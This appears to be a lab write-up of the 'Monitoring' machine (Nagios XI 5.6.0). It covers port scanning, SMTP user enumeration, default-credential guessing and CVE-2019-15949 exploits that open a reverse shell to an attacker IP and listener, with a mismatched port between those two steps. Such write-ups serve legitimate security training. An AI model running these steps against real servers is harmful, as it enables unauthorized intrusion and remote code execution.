# Monitoring

| Name        | Monitoring                    |
| ----------- | ----------------------------- |
| Dificultad: | Easy                          |
| SO:         | Linux                         |
| Tipo:       | VulnHub - OffSec Play Grounds |

## Host
```shell
192.168.196.136
```
## Enumeration
### Nmap
```shell
nmap -Pn 192.168.196.136
nmap -Pn 192.168.196.136 -sC -sV
nmap -Pn 192.168.196.136 -p- --min-rate=1000

PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
389/tcp open  ldap
443/tcp open  https

5667/tcp open  unknown

```
- Port 5667 is a port related with the Nagios service
### SMTP
```shell
telnet 192.168.196.136 25

VRFY root
```
- We confirm the existence of an user called root
### Web Enumeration
#### Port 80
![[00-Assets/01-Monitoring-3.png]]
We can search for default credentials and we found that the admin user is called "nagiosadmin" but the password is stablished while installing the service, then we can try some common passwords:
```shell
nagiosadmin:nagiosadmin
nagiosadmin:password
nagiosadmin:admin

Dave
```
- We can't continue, looks like the connections has been blocked but we find a new possible user

We know that another port for web service is open, let's try it.
#### Port 443
```shell
nagiosadmin:admin

nagios XI 5.6.0
```
![[00-Assets/01-Monitoring.png]]
- We could log in and we found the version of the Nagios service

## Foothold
If we start searching for exploit for this Nagios version we can find the following exploit:
### CVE-2019-15949 - php
- https://github.com/jakgibb/nagiosxi-root-rce-exploit
```shell
php nagios_exp.php --host=192.168.196.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.45.152 --reverseport=8080
```
- We tried to run the PoC but some errors keep appearing. We can search for a way to fix them and we find that we need to install the following `php` libraries:
```shell
sudo apt install php-curl
sudo apt install php-dom
```

Now we need to run the PoC again:
#### PoC
```shell
php nagios_exp.php --host=192.168.196.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.45.152 --reverseport=8080
```
- If we run the `--ssl=true` flag we couldn't connect to the listener
#### Listener
```shell
nc -lnvp 8001
```

![[00-Assets/01-Monitoring-4.png]]


### CVE-2019-15949 - python
- https://github.com/hadrian3689/nagiosxi_5.6.6
This python PoC also worked.
```shell
python3 exp.py -t 'http://192.168.196.136/' -b /nagiosxi/ -u nagiosadmin -p admin -lh 192.168.45.152 -lp 8001
```



